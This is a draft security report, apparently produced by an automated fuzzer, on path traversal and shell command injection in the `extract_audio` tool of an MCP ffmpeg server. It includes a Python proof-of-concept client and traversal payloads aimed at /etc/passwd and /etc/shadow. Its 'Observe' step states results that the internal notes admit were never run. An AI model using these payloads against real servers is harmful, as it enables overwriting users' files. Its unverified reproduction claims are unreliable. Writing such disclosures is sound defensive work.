# Path traversal in `extract_audio`: `inputPath` and `outputPath` are not confined, so audio can be written or overwritten anywhere

**Repository:** `sworddut/mcp-ffmpeg-helper` · **Tool:** `extract_audio` · **Tested commit:** `d68d010`
**Weakness:** CWE-22 Path Traversal

## Summary
`extract_audio` runs ffmpeg to copy the audio track of `inputPath` into `outputPath`. Neither path is checked against a base directory, and `../` sequences and absolute paths are accepted. The server creates the output's parent directories and passes `-y`, so an existing file at `outputPath` is overwritten without asking. A caller can read any media file the server user can read and write output anywhere that user can write.

## Details
`src/tools/handlers.ts:39-46`:

```ts
case "extract_audio": {
  const inputPath = validatePath(String(args?.inputPath), true);
  const outputPath = validatePath(String(args?.outputPath));
  const format = String(args?.format || "mp3");

  await ensureDirectoryExists(outputPath);
  const command = `-i "${inputPath}" -vn -acodec ${format} "${outputPath}" -y`;
  const result = await runFFmpegCommand(command);
```

`validatePath` (`src/utils/file.ts:23-33`) checks only that the string is non-empty and, for the input, that it exists. `ensureDirectoryExists` (`src/utils/file.ts:8-18`) runs `mkdir(dirname(outputPath), { recursive: true })`. Nothing resolves the path or compares it with an allowed root.

A related, more serious problem sits in the same code path. `runFFmpegCommand` (`src/utils/ffmpeg.ts:33-40`) runs `ffmpeg ${command}` with `shell: true`. `format` is inserted unquoted and the paths are only wrapped in double quotes, so shell metacharacters in `format` or `outputPath` are interpreted by `/bin/sh` (CWE-78). Building an argument array and calling `spawn("ffmpeg", args)` without a shell fixes both problems.

## Steps to reproduce
1. Prerequisites: Node.js (README: v14+) and `ffmpeg` on `PATH`. Create a test video with an audio track and a working directory for the server:
   ```bash
   ffmpeg -f lavfi -i testsrc=duration=1:size=64x64:rate=1 -f lavfi -i sine=duration=1 \
          -shortest -pix_fmt yuv420p /tmp/tofu-av.mp4
   mkdir -p /tmp/tofu-work/a/b/c
   ```
2. Install and build as the README describes:
   ```bash
   git clone https://github.com/sworddut/mcp-ffmpeg-helper.git
   cd mcp-ffmpeg-helper && npm install && npm run build
   ```
   The server is `node build/index.js`. The script below starts it with `/tmp/tofu-work/a/b/c` as its working directory.
3. Call the tool:
   ```json
   {"inputPath": "/tmp/tofu-av.mp4", "outputPath": "../../../../../../../../tmp/tofu-poc/audio.m4a", "format": "aac"}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="node",
           args=["/path/to/mcp-ffmpeg-helper/build/index.js"],
           cwd="/tmp/tofu-work/a/b/c",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("extract_audio", {
                   "inputPath": "/tmp/tofu-av.mp4",
                   "outputPath": "../../../../../../../../tmp/tofu-poc/audio.m4a",
                   "format": "aac",
               })
               print(result)

   asyncio.run(main())
   ```
4. Observe: `/tmp/tofu-poc/` is created and `/tmp/tofu-poc/audio.m4a` is written, outside the server's working directory. A second run overwrites it without a prompt.

## Expected behavior
Input and output paths are limited to a configured media or project directory. Paths that resolve outside it are rejected before any directory is created, and existing files are not overwritten unless the caller explicitly asks for it.

## Actual behavior
Any path is accepted. During fuzzing, traversal and absolute paths passed validation and stopped only because the sandbox had no matching input file:

```
{'inputPath': '/videos/valid.mp4', 'outputPath': '../../../../etc/shadow', 'format': 'mp3'}
-> Error: Input file does not exist: /videos/valid.mp4
{'inputPath': '../../../../etc/passwd', 'outputPath': '/tmp/output.mp3', 'format': 'mp3'}
-> Error: Input file does not exist: ../../../../etc/passwd
```

## Impact
The LLM chooses these arguments, and prompt injection in content it reads can steer them. An attacker can make the server create directories and write or overwrite files anywhere the user can write. ffmpeg picks the muxer from the file extension, so overwriting a file without a media extension needs a format flag. `format` is pasted into the command line unquoted, so a value like `aac -f mp4` supplies one. The impact is integrity and availability of the user's files. The shell problem above is more severe and should be reported separately.

## Suggested fix
- Add an allowed root, for example a CLI argument or env var that defaults to the working directory. Resolve both paths (`fs.realpathSync` for the input, `path.resolve` plus a `realpath` of the parent for the output) and reject either one unless it is inside the root.
- Replace the unconditional `-y` with `-n`, or add an explicit `overwrite` argument.
- Validate `format` against a list of codec names, and call `spawn("ffmpeg", argv)` with an argument array and no shell.

## Status on the default branch
Still present at `d68d010` (2026-01-04). The tested commit is the current default branch head.

## Prior reports
- #6 "Security: OS command injection via unsanitized tool arguments in runFFmpegCommand (shell:true)" (issue, open 2026-07-11): reports the `shell: true` command injection that this draft mentions under Details (its PoC uses `extract_audio` `format`). It notes that `validatePath()` only checks existence but does not report path traversal or missing confinement. No fix: the default branch head `d68d010` (2026-01-04) predates it.
- Documentation: README.md: "C:/Users/username/videos/long_video.mp4" (the usage examples pass absolute paths under the user's home, and troubleshooting says only to make sure the app has permission for the given files and directories; there is no security section and no allowed-directory setting, so unconfined paths look like the intended contract)

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: CWE-22 not reported anywhere; the CWE-78 shell problem mentioned in Details is already reported as #6 (open, unfixed), so do not file it again as a new issue.
- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal` (evidence), `check_reflected_output` also fired on this tool.
- Campaigns and executions: corpus-sbx 3072 exec / 3072 ok; e2-0922 1 exec / 1 ok (60 s budgets).
- Evidence (verbatim, trimmed):
  - `{'inputPath': '/etc/passwd\x00', 'outputPath': '/tmp/audio.wav', 'format': 'wav'}` -> `Error: Input file does not exist: /etc/passwd\x00`
  - `{'inputPath': '../../../../etc/passwd', 'outputPath': '/tmp/output.mp3', 'format': 'mp3'}` -> `Error: Input file does not exist: ../../../../etc/passwd`
  - `{'inputPath': '/videos/valid.mp4', 'outputPath': '../../../../etc/shadow', 'format': 'mp3'}` -> `Error: Input file does not exist: /videos/valid.mp4`
- Hand-check hints: weak as CWE-22. There is no containment (confirmed in source), but the server defines no intended directory, and the README shows absolute paths. Every evidence call stopped at the input existence check, so no traversal write was observed. The real issue is CWE-78: `format` is unquoted and the server uses `shell: true` (`src/utils/ffmpeg.ts:36-40`, `handlers.ts:45`). Same root cause as the other 7 drafts for this repo; consider one consolidated path issue plus one CWE-78 issue. The `-acodec aac -f mp4` overwrite claim was derived from ffmpeg option semantics and has not been run. The reproduction above was derived from the code and has not been run.
</details>
